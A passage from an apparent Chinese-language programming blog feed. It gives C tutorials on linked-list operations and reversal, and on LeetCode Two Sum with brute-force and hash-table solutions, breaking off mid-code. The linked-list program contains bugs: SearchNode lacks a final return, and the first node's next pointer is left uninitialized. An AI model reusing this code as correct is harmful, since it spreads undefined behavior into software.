Linked List)</h2><p><img src="/img/LeetCode/Linked_List/reverse-1.png"></p><p>要反轉一個陣列，會需要一個額外節點來暫時存放節點位址。</p><h3 id="解釋"><a href="#解釋" class="headerlink" title="解釋"></a>解釋</h3><p>如果首先就把初始節點 (A節點)的指標指向 NULL 會有個問題，原先的指標存放的是下一個節點的位址，<strong>如果改成 NULL 不就不知道原先下一個節點的位址了嗎?</strong> 連節點位址都沒有要怎麼進行反轉?因此才需要額外的節點才指向到 B 節點，來存放B的記憶體位址。</p><p>因此步驟如下圖：</p><ol><li>定義指標指向 NULL</li><li>建立暫存節點，指向到當前節點的下一個節點</li><li>將當前節點改指向 NULL</li><li>將下一個節點 (B節點)改指向上一個節點 (A節點)</li><li>更新暫存節點的指標，指向再下一個節點的位址<br><img src="/img/LeetCode/Linked_List/reverse-2.png"></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;  </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>current</code>：指向當前節點的指標，初始值為linked list的第一個節點 <code>first_node</code></li><li><code>previous</code>：指向前一個節點的指標，初始值為 NULL，因為在開始時沒有前一個節點</li><li><code>preceding</code>：指向當前節點的下一個節點的指標，初始值為 <code>first_node</code> 的下一個節點</li><li>接著在 while 迴圈內，循環走訪linked list，直到 preceding 變為 NULL</li><li><code>current-&gt;next = previous;</code>：將當前節點的 <code>next</code> 指標指向前一個節點（反轉指標方向）</li><li><code>previous = current;</code>：將 <code>previous</code> 更新為目前節點</li><li><code>current = preceding;</code>：將 <code>current</code> 更新為下一個節點</li><li><code>preceding = preceding-&gt;next;</code>：將 <code>preceding</code> 更新為下一個節點的下一個節點</li><li>接著是最後一個節點的處理，這時也是將，將最後節點的 <code>next</code> 指標指向前一個節點（反轉指標方向）</li><li>另外就是要將初始節點的指標更新為當前節點</li><li><code>first_node = current;</code>：更新linked list的頭節點 <code>first_node</code>，現在 current 指向原始linked list的最後一個節點，即新的頭節點</li></ul><h1 id="全部程式碼"><a href="#全部程式碼" class="headerlink" title="全部程式碼"></a>全部程式碼</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define node</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare Fuctions</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>;</span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">( Node* first,Node* node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> node_numbers;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The numbers of nodes:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">    create_new_node(node_numbers);</span><br><span class="line">    current_node = first_node;</span><br><span class="line">    <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">        current_node=current_node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Traverse the list of nodes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=========================================================\n\n&quot;</span>);</span><br><span class="line">    PrintList(first_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Serach Nodes: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; <span class="built_in">printf</span>(<span class="string">&quot;Node found\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">&quot;Node not found\n&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert Node:&quot;</span>);</span><br><span class="line">    <span class="comment">// User input data</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Node exisit in the list&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Insert behind the current node</span></span><br><span class="line">        InsertNode(first_node,item);</span><br><span class="line">        PrintList(first_node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reverse the list\n&quot;</span>);</span><br><span class="line">    Reverse();</span><br><span class="line">    PrintList(first_node);</span><br><span class="line"></span><br><span class="line">    FreeList(first_node);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/Linked_List/result-1.png"><br><img src="/img/LeetCode/Linked_List/result-2.png"></p><blockquote><p>總結: 透過這次的整理，算是有更加熟悉已經忘光的 linked list 操作，接下來就直接拿相關的LeetCode題目當練習吧</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[1] <a href="https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958">https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958</a><br>[2] <a href="https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-">https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>應用 Hash Table | LeetCode#1  Two Sum</title>
      <link href="/posts/cb46ac9d.html"/>
      <url>/posts/cb46ac9d.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/Two_Sum/two_sum_question.png"></p><p>題目描述給定整數的陣列以及整數 <code>target</code> 值，請在陣列找到任兩元素相加等於 target，並且回傳元素的索引，另外對於每個輸入陣列只會有一組輸出答案。</p><h1 id="解法-1-暴力解"><a href="#解法-1-暴力解" class="headerlink" title="解法-1: 暴力解"></a>解法-1: 暴力解</h1><p>首先一樣從暴力解開始，先有解法，後續再看要怎麼優化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="comment">// init return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// i could not iterated to n-1, since every element is compared.</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; numsSize<span class="number">-1</span>; i++)&#123; </span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; numsSize; j++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = i;</span><br><span class="line">                results[<span class="number">1</span>] = j;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If no solution is found</span></span><br><span class="line">    <span class="built_in">free</span>(results); <span class="comment">// Free the allocated memory before returning</span></span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡的核心做法為: <strong>選擇一個元素，去比較另一個元素，看相加是否為 <code>target</code></strong></p><p>但這麼做的時間複雜度為 $O(n^2)$</p><p>另外因為題目要求回傳陣列需要動態宣告，因此在結尾必須釋放記憶體位址 <code>*returnSize</code> 是用來告訴呼叫者返回的陣列的大小。由於 C 語言不支援直接返回多個值，題目需要指標來修改外部變數，這樣可以傳遞更多的資訊。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果:"></a>執行結果:</h3><p><img src="/img/LeetCode/Two_Sum/two_sum_result-2.png"></p><h1 id="解法-2-使用雜湊表-Hash-Table"><a href="#解法-2-使用雜湊表-Hash-Table" class="headerlink" title="解法-2: 使用雜湊表(Hash Table)"></a>解法-2: 使用雜湊表(Hash Table)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Define hash </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(key) % size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define hash table structure.</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        <span class="type">bool</span> hasData;</span><br><span class="line">    &#125; twosum;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> 